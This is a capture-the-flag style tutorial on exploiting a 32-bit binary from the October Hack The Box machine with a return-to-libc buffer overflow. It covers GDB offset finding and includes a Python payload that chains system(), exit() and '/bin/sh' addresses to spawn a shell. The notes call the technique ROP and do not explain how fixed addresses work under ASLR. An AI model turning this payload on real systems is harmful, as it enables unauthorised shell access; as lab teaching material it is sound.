# Buffer Overflows

## Return Oriented Programming (ROP) Buffer Overflow
The following commands can be used in a Return Oriented Programming (ROP) buffer overflow attack to bypass NX/DEP protection.  The following example makes use of the `ovrflw` ELF binary found on the October Hack The Box machine.  All tools necessary are built into Kali Linux.

The ovrflw binary is 32 bit and has NX enabled and the system has Address Space Layout Randomisation enabled.


### Finding the point that overwrites EIP CPU Register

The following command can be used to generate a 500 character non repeating pattern to overlow the program:

```/usr/bin/msf-pattern_create -l 500```

The resulting output can be fed as an input to the binary:

```./ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A...```

You can increase the length of the pattern generated by the `/usr/bin/msf-pattern_create` command and send it to the program, until the program generates a `segmentation fault` error.

Upon the generation of a `segmentation fault`being thrown by the overflw program, it can then be ran within the debugger GDB to find what section of the pattern overwrote the EIP CPU register:

```gdb ./ovrflw```

Now a break point for the `main()` function can be added, the the program will pause once run within GDB.  The following code will add the break point:

```(gdb) b main```

The program can now be run by pressing the "r" key followed by the none repeating string of characters (in this case 500):

```r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4A...```

To continue the exection of the program the "c" key can be pressed.  This will result in a "
Program received signal SIGSEGV, Segmentation fault." error.


### Python Exploit Code
```#!/usr/bin/python

import struct

system_mem = struct.pack("<I", 0xb7646310)
binsh_mem = struct.pack("<I", 0xb7768bac)
exit_mem = struct.pack("<I", 0xb7639260)

payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab"
payload += system_mem
payload += exit_mem
payload += binsh_mem

print(payload)```

